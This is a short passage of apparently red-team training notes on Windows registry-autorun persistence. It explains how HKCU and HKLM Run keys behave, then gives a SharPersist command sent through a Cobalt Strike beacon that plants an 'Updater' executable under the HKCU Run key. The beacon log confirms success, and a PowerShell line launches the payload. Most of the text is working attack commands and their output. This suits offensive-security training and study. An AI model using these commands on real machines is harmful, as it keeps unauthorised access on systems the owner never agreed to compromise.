





  It's a common misconception that an HKLM autorun will execute the payload as SYSTEM, but this is not the case.  An HKCU autorun will only trigger when the owner of the hive logs into the machine.  An HKLM autorun will trigger when any user logs into the machine, but it will still run under the context of the user's account.

```python
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\persist\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```



```python
[04/07 13:36:31] beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\persist\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
[04/07 13:36:34] [*] Tasked beacon to run .NET program: SharPersist.exe -t reg -c "C:\persist\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
[04/07 13:36:34] [+] host called home, sent: 354712 bytes
[04/07 13:36:35] [+] received output:

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\persist\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\persist\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```


```python
Start-Process -FilePath "C:\persist\Updater.exe" -ArgumentList "/q","/n"
```